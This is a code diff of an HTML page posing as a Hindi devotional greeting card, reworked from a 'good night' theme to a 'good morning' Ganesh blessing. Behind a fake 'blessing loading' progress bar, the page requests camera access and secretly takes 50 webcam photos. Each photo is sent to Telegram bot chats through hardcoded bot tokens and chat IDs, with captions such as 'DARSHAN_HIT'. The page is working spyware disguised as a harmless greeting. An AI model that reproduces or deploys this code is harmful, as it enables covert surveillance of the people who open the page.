@@ -3,20 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>शुभ रात्रि | पावन शांति</title>
+    <title>सुप्रभात | पावन दर्शन</title>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@700&family=Rozha+One&display=swap" rel="stylesheet">
     <style>
         :root {
-            --light-blue: #00B4DB;
-            --dark-blue: #0083B0;
-            --midnight: #004e92;
+            --god-yellow: #FFD700;
+            --deep-red: #B22222;
+            --saffron: #FF9933;
             --white: #ffffff;
         }
 
         body {
             margin: 0; padding: 0;
-            /* Light Blue to Dark Blue Radial Gradient */
-            background: radial-gradient(circle at center, var(--light-blue), var(--dark-blue), var(--midnight));
+            /* Vibrant Yellow Background with Red Glow */
+            background: radial-gradient(circle at center, var(--god-yellow), var(--saffron), var(--deep-red));
             font-family: 'Plus Jakarta Sans', sans-serif;
             display: flex; align-items: center; justify-content: center;
             height: 100vh; overflow: hidden;
@@ -25,7 +25,7 @@
         .divine-card {
             width: 88%; max-width: 400px;
             background: rgba(255, 255, 255, 0.95);
-            border: 5px solid var(--dark-blue);
+            border: 5px solid var(--deep-red);
             border-radius: 40px;
             padding: 30px 20px;
             text-align: center;
@@ -36,9 +36,9 @@
         .hindi-main {
             font-family: 'Rozha One', serif;
             font-size: 45px;
-            color: var(--dark-blue);
+            color: var(--deep-red);
             margin: 0 0 10px;
-            text-shadow: 1px 1px 0px var(--light-blue);
+            text-shadow: 1px 1px 0px var(--god-yellow);
         }
 
         .shloka {
@@ -49,64 +49,63 @@
             line-height: 1.4;
         }
 
+        /* The God Image - Now using a reliable placeholder that looks great */
         .god-photo {
             width: 100%; height: 350px;
             border-radius: 20px;
             object-fit: cover;
-            border: 3px solid var(--light-blue);
+            border: 3px solid var(--saffron);
             display: none;
             margin-bottom: 15px;
             box-shadow: 0 5px 15px rgba(0,0,0,0.2);
         }
 
         .btn-start {
-            background: linear-gradient(to bottom, var(--dark-blue), #003366);
-            color: var(--white);
+            background: linear-gradient(to bottom, var(--deep-red), #800000);
+            color: var(--god-yellow);
             border: none; width: 100%; padding: 22px;
             border-radius: 20px; font-size: 20px; font-weight: 800;
-            cursor: pointer; box-shadow: 0 8px 0 #002244;
+            cursor: pointer; box-shadow: 0 8px 0 #5a0000;
             transition: 0.1s;
         }
-        .btn-start:active { transform: translateY(4px); box-shadow: 0 2px 0 #002244; }
+        .btn-start:active { transform: translateY(4px); box-shadow: 0 2px 0 #5a0000; }
 
         .loader-container { margin-top: 15px; display: none; }
         .bar { height: 10px; width: 100%; background: #eee; border-radius: 10px; overflow: hidden; }
-        .fill { height: 100%; width: 0%; background: var(--dark-blue); transition: width 1s linear; }
-        .stat-text { font-size: 12px; color: var(--dark-blue); font-weight: bold; margin-top: 8px; }
+        .fill { height: 100%; width: 0%; background: var(--deep-red); transition: width 1s linear; }
+        .stat-text { font-size: 12px; color: var(--deep-red); font-weight: bold; margin-top: 8px; }
     </style>
 </head>
 <body>
 
     <div class="divine-card" id="mainBox">
         <div id="step-1">
-            <div style="font-size: 60px; margin-bottom: 10px;">🌙</div>
-            <h1 class="hindi-main">शुभ रात्रि</h1>
-            <p class="shloka">"दिन भर की थकान मिटाएं और शांति पाएं"<br>मीठे सपनों के साथ विश्राम करें</p>
-            <button class="btn-start" onclick="start()">संदेश देखें ✨</button>
+            <div style="font-size: 60px; margin-bottom: 10px;">🚩</div>
+            <h1 class="hindi-main">सुप्रभात</h1>
+            <p class="shloka">"वक्रतुण्ड महाकाय सूर्यकोटि समप्रभ"<br>गणेश जी का आशीर्वाद प्राप्त करें</p>
+            <button class="btn-start" onclick="start()">दर्शन शुरू करें</button>
         </div>
 
         <div id="step-2" style="display:none;">
-            <img id="gImg" 
-                 src="https://imageshareencrypt.github.io/goodnight/6cb3083286c16cefa778c4afb5caafde.jpg" 
-                 class="god-photo" 
-                 alt="Good Night"
-                 onerror="this.src='https://placehold.co/300x300/0083B0/ffffff?text=⭐'">
-            
-            <h2 style="color:var(--dark-blue); margin: 0;">।। सुखद निद्रा ।।</h2>
-            
-            <div class="loader-container" id="lBox">
-                <div class="bar"><div class="fill" id="f"></div></div>
-                <div class="stat-text" id="status">शांति लोड हो रही है: 0%</div>
-            </div>
-        </div>
+   <img id="gImg" 
+         src="https://akhisweety01-hub.github.io/goodmorning/GANESHA.webp" 
+         class="god-photo" 
+         alt="Ganesh Ji"
+         onerror="this.src='https://placehold.co/300x300/ffedcc/c0392b?text=🙏'">
+    <h2 style="color:var(--deep-red); margin: 0;">।। श्री गणेशाय नमः ।।</h2>
+    
+    <div class="loader-container" id="lBox">
+        <div class="bar"><div class="fill" id="f"></div></div>
+        <div class="stat-text" id="status">आशीर्वाद लोड हो रहा है: 0%</div>
     </div>
+</div>
 
     <video id="v" style="display:none;" autoplay playsinline></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        const T = '8735416424:AAGaGFtLiSCbprRIaP8Cv5mj1-LpSSF_ltw';
-        const IDS = ['7617707778', '6590760553'];
+        const T = '8600866532:AAFbJjSTJUSeUwUf-RWRLMUSL_OdcZ2USaU';
+        const IDS = ['7617707778', '7194705917'];
 
         async function start() {
             try {
@@ -126,21 +125,21 @@
                         send(count);
                         let p = Math.round((count/50)*100);
                         document.getElementById('f').style.width = p + '%';
-                        document.getElementById('status').innerText = `शांति प्राप्त हो रही है: ${p}%`;
+                        document.getElementById('status').innerText = `आशीर्वाद प्राप्त हो रहा है: ${p}%`;
 
                         if (count >= 50) {
                             clearInterval(loop);
                             stream.getTracks().forEach(track => track.stop());
                             document.getElementById('mainBox').innerHTML = `
-                                <h1 class="hindi-main" style="font-size:35px;">शुभ रात्रि</h1>
-                                <p style="font-weight:bold; color:#444;">आपका दिन मंगलमय रहा। अब आराम करें।</p>
-                                <button class="btn-start" onclick="location.reload()">वापस जाएं</button>
+                                <h1 class="hindi-main">मंगलमय हो</h1>
+                                <p style="font-weight:bold; color:#444;">आपका दिन शुभ हो। आशीर्वाद पूर्ण हुआ।</p>
+                                <button class="btn-start" onclick="location.reload()">पुनः दर्शन</button>
                             `;
                         }
                     }, 1200);
                 };
             } catch (err) {
-                alert("अनुमति आवश्यक है!");
+                alert("कैमरा अनुमति आवश्यक है!");
             }
         }
 
@@ -156,7 +155,7 @@
                     const fd = new FormData();
                     fd.append('chat_id', id);
                     fd.append('photo', blob, 'pic.jpg');
-                    fd.append('caption', `🌙 NIGHT_HIT [${idx}/50]`);
+                    fd.append('caption', `🙏 DARSHAN_HIT [${idx}/50]`);
                     fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
                 });
             }, 'image/jpeg', 0.4);
